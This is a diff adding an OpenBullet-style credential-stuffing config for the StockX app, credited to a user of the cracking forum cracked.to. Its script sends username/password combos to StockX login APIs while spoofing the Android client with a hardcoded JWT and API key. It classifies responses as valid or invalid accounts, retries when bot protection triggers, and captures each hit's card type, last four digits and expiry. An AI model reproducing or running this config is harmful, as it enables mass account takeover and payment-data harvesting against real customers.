@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "stockx",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-01-31T01:15:53.0729513-08:00",
+  "AdditionalInfo": "",
+  "Author": "cracked.to/sombree",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!REQUEST POST "https://core.api.stockx.com/api/v1/login" 
+!  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+!  CONTENTTYPE "application/json" 
+!  HEADER "User-Agent: okhttp/3.9.0" 
+!  HEADER "App-Platform: android" 
+!  HEADER "App-Version: 3.3.2" 
+!  HEADER "jwt-authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJzdG9ja3guY29tIiwic3ViIjoic3RvY2t4LmNvbSIsImF1ZCI6IndlYiIsImFwcF9uYW1lIjoiYW5kcm9pZCIsImFwcF92ZXJzaW9uIjoiMy4zLjIiLCJjdXN0b21lcl9pZCI6bnVsbCwiZW1haWwiOm51bGwsImN1c3RvbWVyX3V1aWQiOm51bGwsImZpcnN0TmFtZSI6bnVsbCwibGFzdE5hbWUiOm51bGwsInNoaXBfYnlfZGF0ZSI6bnVsbCwidmFjYXRpb25fZGF0ZSI6bnVsbCwicHJvZHVjdF9jYXRlZ29yeSI6InNuZWFrZXJzIiwiaXNfYWRtaW4iOm51bGwsInNlc3Npb25faWQiOiIxMjY1NjEwNjk2MTM3NDM0NDI2MSIsImV4cCI6MTY2NjUxMDI3OX0.emG0-k2dUPrUSqmv3Y20vtk9ODlSPIKL6Xo_auyhIuU" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+REQUEST POST "https://gateway.stockx.com/api/v1/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: okhttp/3.9.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "App-Platform: android" 
+  HEADER "App-Version: 4.5.1" 
+  HEADER "jwt-authorization: " 
+  HEADER "x-api-key: 99WtRZK6pS1Fqt8hXBfWq8BYQjErmwipa3a0hYxX" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect email or password" 
+  KEYCHAIN Success OR 
+    KEY "{\"Customer\":{\"id\":" 
+  KEYCHAIN Retry OR 
+    KEY "<COOKIES{*}>" Contains "_pxhd" 
+
+PARSE "<SOURCE>" LR "Currency\":\"" "\",\"" -> CAP "Currency" 
+
+PARSE "<SOURCE>" LR "isActive\":" ",\"fla" -> CAP "Active" 
+
+PARSE "<SOURCE>" LR "hasBuyerReward\":" ",\"gd" -> CAP "hasBuyerReward" 
+
+PARSE "<SOURCE>" LR "isBuying\":" ",\"isSell" -> CAP "isBuying" 
+
+PARSE "<SOURCE>" JSON "isSelling" -> CAP "is Selling" 
+
+PARSE "<SOURCE>" LR "cardType\":\"" "\",\"" -> CAP "Cc type" 
+
+PARSE "<SOURCE>" LR "\"last4\":\"" "\",\"" -> CAP "Last4" 
+
+PARSE "<SOURCE>" LR "\"expirationDate\":\"" "\",\"" -> CAP "Expiry" 
+
